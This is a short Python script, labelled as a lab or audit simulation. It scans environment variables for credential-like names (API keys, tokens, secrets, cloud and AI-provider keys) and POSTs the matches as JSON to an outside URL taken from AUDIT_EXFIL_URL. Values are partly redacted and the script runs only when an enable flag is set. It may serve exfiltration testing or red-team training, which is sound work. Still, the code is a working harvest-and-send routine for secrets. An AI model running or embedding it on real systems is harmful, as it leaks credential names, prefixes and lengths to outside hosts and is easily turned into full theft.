#!/usr/bin/env python3
"""LAB: enumerate API-like env vars and POST JSON to AUDIT_EXFIL_URL."""

from __future__ import annotations

import json
import os
import sys
import urllib.error
import urllib.request

KEY_SUBSTRINGS = (
    "API_KEY",
    "APIKEY",
    "TOKEN",
    "SECRET",
    "PASSWORD",
    "BEARER",
    "AUTH",
    "CREDENTIAL",
    "PRIVATE_KEY",
    "ACCESS_KEY",
    "SESSION",
    "OPENAI",
    "ANTHROPIC",
    "GITHUB",
    "KUBE",
    "AWS_",
    "GCP_",
    "AZURE_",
    "OPENCLAW",
)


def redact(value: str, max_hint: int = 64) -> dict:
    v = value if len(value) <= max_hint else value[:max_hint] + "…"
    if len(v) <= 2:
        return {"redacted": "***", "len": len(value)}
    return {"prefix": v[:2], "suffix_redacted": "***", "len": len(value)}


def main() -> int:
    if os.environ.get("AUDIT_SIM_ENABLE") != "1":
        print("Set AUDIT_SIM_ENABLE=1", file=sys.stderr)
        return 2
    url = os.environ.get("AUDIT_EXFIL_URL", "").strip()
    if not url:
        print("Set AUDIT_EXFIL_URL to your sink (e.g. https://httpbin.org/post)", file=sys.stderr)
        return 2

    matches: list[dict] = []
    for k, val in os.environ.items():
        ku = k.upper()
        if any(s in ku for s in KEY_SUBSTRINGS):
            vs = val if isinstance(val, str) else str(val)
            matches.append({"key": k, "value": redact(vs)})

    body = json.dumps(
        {"source": "audit-exfil-env", "matches": matches},
        ensure_ascii=True,
    ).encode("utf-8")

    req = urllib.request.Request(
        url,
        data=body,
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            _ = resp.read(4096)
    except urllib.error.URLError as e:
        print(json.dumps({"ok": False, "error": str(e)}, ensure_ascii=True))
        return 0

    print(json.dumps({"ok": True, "posted_keys": len(matches)}, ensure_ascii=True))
    return 0


if __name__ == "__main__":
    sys.exit(main())
